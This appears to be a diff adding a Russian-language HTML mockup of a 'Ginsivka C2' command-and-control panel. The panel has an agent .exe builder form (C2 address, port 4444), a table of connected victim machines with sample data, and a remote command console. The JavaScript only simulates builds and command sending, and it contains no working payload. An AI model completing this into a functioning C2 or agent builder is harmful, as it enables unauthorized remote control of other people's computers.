@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ginsivka C2 Panel</title>
+    <!-- Подключаем стили Tailwind CSS для красивого хакерского дизайна -->
+    <script src="https://jsdelivr.net"></script>
+    <style>
+        body { background-color: #0d0d11; color: #e4e4e7; font-family: monospace; }
+        .panel-border { border: 1px solid #331b3f; }
+        .accent-color { color: #d946ef; }
+        .btn-accent { background-color: #86198f; }
+        .btn-accent:hover { background-color: #a21caf; }
+    </style>
+</head>
+<body class="p-6">
+
+    <!-- Шапка панели -->
+    <header class="mb-6 flex justify-between items-center border-b border-zinc-800 pb-4">
+        <h1 class="text-2xl font-bold tracking-wider accent-color">GINSIVKA C2 // PANEL</h1>
+        <div class="text-sm text-zinc-500">Статус: <span class="text-green-500 font-bold">ONLINE</span></div>
+    </header>
+
+    <!-- Основная сетка интерфейса -->
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        
+        <!-- ЛЕВАЯ КОЛОНКА: СБОРЩИК БИЛДА (BUILD SETTINGS) -->
+        <div class="panel-border bg-zinc-900/50 p-4 rounded-lg shadow-xl">
+            <h2 class="text-lg font-semibold mb-4 text-zinc-300 border-b border-zinc-800 pb-2">📦 User Build Settings</h2>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs text-zinc-400 mb-1">C2 IP или API URL</label>
+                    <input type="text" id="buildIp" value="127.0.0.1" class="w-full bg-zinc-950 border border-zinc-800 rounded p-2 text-sm text-white focus:outline-none focus:border-purple-500">
+                </div>
+                <div>
+                    <label class="block text-xs text-zinc-400 mb-1">Порт соединения</label>
+                    <input type="text" id="buildPort" value="4444" class="w-full bg-zinc-950 border border-zinc-800 rounded p-2 text-sm text-white focus:outline-none focus:border-purple-500">
+                </div>
+                <div>
+                    <label class="block text-xs text-zinc-400 mb-1">Имя агента (.exe)</label>
+                    <input type="text" id="buildName" value="agent.exe" class="w-full bg-zinc-950 border border-zinc-800 rounded p-2 text-sm text-white focus:outline-none focus:border-purple-500">
+                </div>
+                
+                <button onclick="generateBuild()" class="w-full btn-accent text-white font-bold py-2.5 px-4 rounded text-sm transition shadow-lg cursor-pointer">
+                    Скомпилировать Билд (Build)
+                </button>
+
+                <div class="text-xs text-zinc-500 mt-2 bg-zinc-950 p-2 rounded border border-zinc-900">
+                    Статус сборки: <span id="buildStatus" class="text-zinc-400">Ожидание...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- СРЕДНЯЯ КОЛОНКА: ПОДКЛЮЧЕННЫЕ УСТРОЙСТВА -->
+        <div class="panel-border bg-zinc-900/50 p-4 rounded-lg shadow-xl lg:col-span-2">
+            <h2 class="text-lg font-semibold mb-4 text-zinc-300 border-b border-zinc-800 pb-2">🖥️ Подключенные Агенты</h2>
+            
+            <div class="overflow-x-auto">
+                <table class="w-full text-left text-sm text-zinc-400">
+                    <thead class="bg-zinc-950 text-xs text-zinc-500 uppercase border-b border-zinc-800">
+                        <tr>
+                            <th class="p-3">ID</th>
+                            <th class="p-3">IP Адрес</th>
+                            <th class="p-3">Операционная система</th>
+                            <th class="p-3">Действие</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Пример строки с подключенным устройством (тестовые данные) -->
+                        <tr class="border-b border-zinc-900 hover:bg-zinc-800/30 transition">
+                            <td class="p-3 font-bold text-white">#01</td>
+                            <td class="p-3 text-zinc-300">192.168.1.105</td>
+                            <td class="p-3 text-sm text-green-400">Windows 11 Pro X64</td>
+                            <td class="p-3">
+                                <button onclick="selectAgent('01')" class="text-xs bg-zinc-800 hover:bg-purple-900 border border-zinc-700 hover:border-purple-500 text-white px-2 py-1 rounded transition cursor-pointer">
+                                    Управлять
+                                </button>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- НИЖНЯЯ ПАНЕЛЬ: КОНСОЛЬ И ОТПРАВКА КОМАНД -->
+    <div class="panel-border bg-zinc-900/50 p-4 rounded-lg shadow-xl mt-6">
+        <h2 class="text-lg font-semibold mb-2 text-zinc-300">🎮 Терминал Управления: <span id="activeAgent" class="accent-color">Устройство не выбрано</span></h2>
+        
+        <!-- Окно логов (скроллируемая область) -->
+        <div id="terminalLog" class="h-48 bg-zinc-950 border border-zinc-900 rounded p-3 text-xs overflow-y-auto space-y-1 mb-4 text-green-400">
+            <div>[*] Панель Ginsivka C2 успешно инициализирована в браузере...</div>
+        </div>
+
+        <!-- Поле ввода команды -->
+        <div class="flex gap-2">
+            <input type="text" id="cmdInput" placeholder="Введите системную команду (например: dir, whoami)..." class="flex-1 bg-zinc-950 border border-zinc-800 rounded p-2 text-sm text-white focus:outline-none focus:border-purple-500">
+            <button onclick="sendCommand()" class="btn-accent text-white px-6 py-2 rounded text-sm font-bold transition cursor-pointer">Отправить</button>
+        </div>
+    </div>
+
+    <!-- Логика работы интерфейса в браузере -->
+    <script>
+        let selectedAgent = null;
+
+        function selectAgent(id) {
+            selectedAgent = id;
+            document.getElementById('activeAgent').innerText = "Агент #" + id;
+            addLog(`[+] Выбран агент #${id} для удаленного сеанса.`);
+        }
+
+        function sendCommand() {
+            const input = document.getElementById('cmdInput');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+            if (!selectedAgent) {
+                alert("Сначала выберите устройство из таблицы!");
+                return;
+            }
+
+            addLog(`<span class="text-zinc-500">C2-Shell-ID-${selectedAgent}></span> ${cmd}`);
+            // Здесь в будущем будет отправка на ваш реальный бэкенд
+            input.value = '';
+        }
+
+        function generateBuild() {
+            const ip = document.getElementById('buildIp').value;
+            const port = document.getElementById('buildPort').value;
+            const status = document.getElementById('buildStatus');
+
+            status.innerHTML = `<span class="text-yellow-500">Сборка запущена для ${ip}:${port}...</span>`;
+            
+            // Имитация работы для проверки внешнего вида интерфейса
+            setTimeout(() => {
+                status.innerHTML = `<span class="text-green-500 font-bold">Готово! Файл сгенерирован.</span>`;
+            }, 1500);
+        }
+
+        function addLog(text) {
+            const logBox = document.getElementById('terminalLog');
+            logBox.innerHTML += `<div>${text}</div>`;
+            logBox.scrollTop = logBox.scrollHeight; // Автопрокрутка вниз
+        }
+    </script>
+</body>
+</html>
+
